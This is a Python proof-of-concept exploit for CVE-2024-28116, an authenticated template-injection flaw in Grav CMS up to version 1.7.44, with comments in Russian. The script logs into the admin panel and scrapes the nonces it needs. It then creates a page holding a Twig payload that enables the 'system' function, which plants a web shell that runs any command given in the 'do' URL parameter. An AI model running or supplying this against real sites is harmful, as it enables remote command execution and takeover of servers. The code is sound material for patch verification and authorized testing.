# PoC script exploit an authenticated SSTI vulnerability 
# Grav CMS version <= 1.7.44 (CVE-2024-28116)
# allow OS command execution on a remote server

import requests
import re
import argparse
from urllib.parse import urlparse
import string
import random
import logging

# Конфиг
GRAV_USER = "youruser"
GRAV_PASSWORD = "yourpassword"

# настройки логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("GenGravSSTIExploit")

# Парсинг аргументов командной строки для указания целевого URL и порта
def parse_arguments():
    parser = argparse.ArgumentParser(description="GenGravSSTIExploit")
    parser.add_argument("-t", "--target_url", required=True, help="Целевой URL в формате 'http[s]://hostname'")
    parser.add_argument("-p", "--port", type=int, default=80, help="Номер порта (по умолчанию 80)")
    return parser.parse_args()

# Валидация формата целевого URL
def validate_url(target_url):
    if not re.match(r'^(https?://\w+)', target_url):
        raise ValueError("Неверный формат URL. Используйте формат 'http://hostname' или 'https://hostname'.")

# Извлечение токена login-nonce из ответа
def extract_login_data(response_text):
    login_nonce_search = re.search(r'<input type="hidden" name="login-nonce" value="([^"]+)"', response_text)
    return login_nonce_search.group(1) if login_nonce_search else None

# Построение URL админ-панели Grav CMS
def build_admin_url(base_url, port):
    return f"{base_url}:{port}/admin", urlparse(base_url).hostname

# Вход в Grav CMS с использованием учетных данных
def login_to_grav(url_admin, username, password, session_cookie, login_nonce):
    post_data = {
        "data[username]": username,
        "data[password]": password,
        "task": "login",
        "login-nonce": login_nonce
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": session_cookie
    }
    return requests.post(url_admin, data=post_data, headers=headers)

# Извлечение токена admin-nonce из страницы админ-панели
def extract_admin_nonce(console_text):
    admin_nonce_search = re.search(r'admin_nonce: \'([^\']+)\'', console_text)
    return admin_nonce_search.group(1) if admin_nonce_search else None

# Создание новой страницы в Grav CMS для инъекции полезной нагрузки
def create_new_page(url_admin, session_cookie, admin_nonce):
    random_suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
    page_name = f"poc_{random_suffix}"

    post_data = {
        "data[title]": page_name,
        "data[folder]": page_name,
        "data[route]": "",
        "data[name]": "default",
        "data[visible]": "1",
        "task": "continue",
        "admin-nonce": admin_nonce
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": session_cookie
    }
    
    response = requests.post(f"{url_admin}/pages", data=post_data, headers=headers)
    return page_name if response.status_code in [200, 303] else None

# Инъекция SSTI-полезной нагрузки в содержимое созданной страницы
def inject_payload(url_admin, page_name, session_cookie, form_nonce, unique_form_id):
    payload = """{% set arr = {'1': 'system', '2':'foo'} %}
{% set dump = print_r(grav.twig.twig_vars['config'].set('system.twig.safe_functions', arr)) %}
{% set cmd = uri.query('do') is empty ? 'whoami' : uri.query('do') %}
<pre>Cmd-Output:</pre>
<h5>{{ system(cmd) }}</h5>"""

    post_data = {
        "task": "save",
        "data[header][title]": page_name,
        "data[content]": payload,
        "data[folder]": page_name,
        "data[route]": "",
        "data[name]": "default",
        "data[header][body_classes]": "",
        "data[ordering]": "1",
        "data[order]": "",
        "toggleable_data[header][process]": "on",
        "data[header][process][markdown]": "1",
        "data[header][process][twig]": "1",
        "data[header][order_by]": "",
        "data[header][order_manual]": "",
        "data[blueprint]": "",
        "data[lang]": "",
        "_post_entries_save": "edit",
        "__form-name__": "flex-pages",
        "__unique_form_id__": unique_form_id,
        "form-nonce": form_nonce,
        "toggleable_data[header][published]": "0",
        "toggleable_data[header][date]": "0",
        "toggleable_data[header][publish_date]": "0",
        "toggleable_data[header][unpublish_date]": "0",
        "toggleable_data[header][metadata]": "0",
        "toggleable_data[header][dateformat]": "0",
        "toggleable_data[header][menu]": "0",
        "toggleable_data[header][slug]": "0",
        "toggleable_data[header][redirect]": "0",
        "toggleable_data[header][twig_first]": "0",
        "toggleable_data[header][never_cache_twig]": "0",
        "toggleable_data[header][child_type]": "0",
        "toggleable_data[header][routable]": "0",
        "toggleable_data[header][cache_enable]": "0",
        "toggleable_data[header][visible]": "0",
        "toggleable_data[header][debugger]": "0",
        "toggleable_data[header][template]": "0",
        "toggleable_data[header][append_url_extension]": "0",
        "toggleable_data[header][redirect_default_route]": "0",
        "toggleable_data[header][routes][default]": "0",
        "toggleable_data[header][routes][canonical]": "0",
        "toggleable_data[header][routes][aliases]": "0",
        "toggleable_data[header][admin][children_display_order]": "0",
        "toggleable_data[header][login][visibility_requires_access]": "0",
        "toggleable_data[header][permissions][inherit]": "0",
        "toggleable_data[header][permissions][authors]": "0",
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": session_cookie
    }
    
    response = requests.post(f"{url_admin}/pages/{page_name}", data=post_data, headers=headers)
    return response.status_code in [200, 303]


# Получение аргументов командной строки
args = parse_arguments()

try:
    logger.info("Проверка целевого URL...")
    # Валидация целевого URL
    validate_url(args.target_url)
    
    # Построение URL для админ-панели Grav CMS
    url_admin, hostname = build_admin_url(args.target_url, args.port)

    logger.info("Получение session cookie и login-nonce...")
    # Запрос к админ-панели для получения session cookie и login-nonce
    with requests.get(url_admin) as initial_response:
        initial_response.raise_for_status()
        session_cookie = initial_response.headers.get('Set-Cookie', '').split(';', 1)[0]
        login_nonce = extract_login_data(initial_response.text)

    if not login_nonce:
        logger.error("[E] Не удалось найти login-nonce в ответе.")
        exit(1)

    logger.info("Попытка аутентификации в Grav CMS...")
    # Вход в систему Grav CMS
    login_response = login_to_grav(url_admin, GRAV_USER, GRAV_PASSWORD, session_cookie, login_nonce)
    
    if login_response.status_code != 303:
        logger.error("[E] Ошибка аутентификации в Grav CMS.")
        exit(1)

    logger.info("Доступ к админ-панели после аутентификации...")
    # Запрос к админ-панели после аутентификации
    with requests.get(url_admin, headers={"Cookie": session_cookie}) as console_response:
        console_response.raise_for_status()
        # Извлечение admin-nonce
        admin_nonce = extract_admin_nonce(console_response.text)
    
    if not admin_nonce:
        logger.error("[E] Не удалось найти admin-nonce в ответе.")
        exit(1)

    logger.info("Создание новой страницы...")
    # Создание новой страницы для инъекции
    page_name = create_new_page(url_admin, session_cookie, admin_nonce)
    if not page_name:
        logger.error("[E] Ошибка при создании новой страницы.")
        exit(1)

    logger.info("Получение form-nonce и unique_form_id...")
    # Запрос к новой странице для получения form-nonce и unique_form_id
    with requests.get(f"{url_admin}/pages/{page_name}/:add", headers={"Cookie": session_cookie}) as page_response:
        form_nonce_search = re.search(r'<input type="hidden" name="form-nonce" value="([^"]+)"', page_response.text)
        unique_form_id_search = re.search(r'<input type="hidden" name="__unique_form_id__" value="([^"]+)"', page_response.text)
        
        form_nonce = form_nonce_search.group(1) if form_nonce_search else None
        unique_form_id = unique_form_id_search.group(1) if unique_form_id_search else None
    
    if not form_nonce or not unique_form_id:
        logger.error("[E] Не удалось найти form-nonce или __unique_form_id__ в ответе.")
        exit(1)

    logger.info("Инъекция RCE-полезной нагрузки...")
    # Инъекция SSTI полезной нагрузки
    if inject_payload(url_admin, page_name, session_cookie, form_nonce, unique_form_id):
        logger.info(f"[+] Инъекция RCE успешна. Перейдите по ссылке: {args.target_url}:{args.port}/{page_name}?do=<command>")
    else:
        logger.error("[E] Ошибка при инъекции полезной нагрузки.")
        exit(1)

except requests.exceptions.RequestException as e:
    logger.error(f"Ошибка HTTP-запроса: {e}")
except Exception as e:
    logger.error(f"Ошибка: {e}")
